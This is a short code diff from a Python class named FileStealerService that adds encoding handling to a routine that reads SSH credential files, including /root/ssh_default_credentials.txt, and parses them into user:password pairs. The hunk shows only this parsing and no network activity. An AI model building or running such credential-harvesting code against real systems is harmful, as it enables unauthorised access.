@@ -14,7 +14,7 @@ class FileStealerService:
         creds = []
         for p in (path, "/root/ssh_default_credentials.txt"):
             if os.path.exists(p):
-                with open(p) as f:
+                with open(p, encoding="utf-8", errors="replace") as f:
                     for line in f:
                         parts = line.strip().split(":", 1)
                         if len(parts) == 2:
